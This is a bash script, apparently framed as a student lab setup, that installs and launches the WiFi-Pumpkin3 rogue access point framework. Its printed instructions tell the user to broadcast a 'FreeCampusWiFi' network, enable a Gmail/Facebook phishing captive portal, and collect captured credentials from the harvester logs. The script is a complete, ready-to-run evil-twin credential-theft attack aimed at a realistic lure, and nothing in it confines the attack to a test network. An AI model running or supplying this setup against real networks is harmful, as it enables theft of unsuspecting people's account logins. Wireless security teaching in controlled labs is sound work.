#!/bin/bash

echo "[+] Starting WiFi-Pumpkin3 automated lab setup..."

# Check for root
if [[ $EUID -ne 0 ]]; then
   echo "[!] Please run this script as root."
   exit 1
fi

# Step 1: Update and install dependencies
echo "[1/5] Installing dependencies..."
apt update -y
apt install -y git python3-pip dnsmasq hostapd net-tools

# Step 2: Clone WiFi-Pumpkin3 if not already present
echo "[2/5] Cloning WiFi-Pumpkin3..."
cd /opt
if [ ! -d "wifi-pumpkin3" ]; then
    git clone https://github.com/P0cL4bs/wifi-pumpkin3.git
else
    echo "[i] WiFi-Pumpkin3 already cloned."
fi
cd wifi-pumpkin3
pip3 install -r requirements.txt
python3 setup.py install

# Step 3: Detect Wi-Fi adapter that supports AP mode
echo "[3/5] Detecting Wi-Fi adapters..."
AP_IFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -v wlan0 | head -n 1)
if [[ -z "$AP_IFACE" ]]; then
    echo "[!] No external Wi-Fi adapter found that can run AP mode."
    echo "[!] Plug in a USB Wi-Fi adapter that supports AP mode and try again."
    exit 1
fi
echo "[✓] Using interface: $AP_IFACE"

# Step 4: Suggest configuration settings to the student
echo "[4/5] Suggested WiFi-Pumpkin3 configuration:"
echo "--------------------------------------------"
echo "SSID:      FreeCampusWiFi"
echo "Channel:   6"
echo "Interface: $AP_IFACE"
echo
echo "After launch:"
echo "1. Go to 'Access Point > Settings' and start the AP."
echo "2. Enable 'Phishing > Captive Portal' or Gmail/Facebook."
echo "3. Monitor captured credentials under 'Credential Harvester > Logs'."
echo "--------------------------------------------"

# Step 5: Launch WiFi-Pumpkin3
echo "[5/5] Launching WiFi-Pumpkin3..."
wifi-pumpkin3
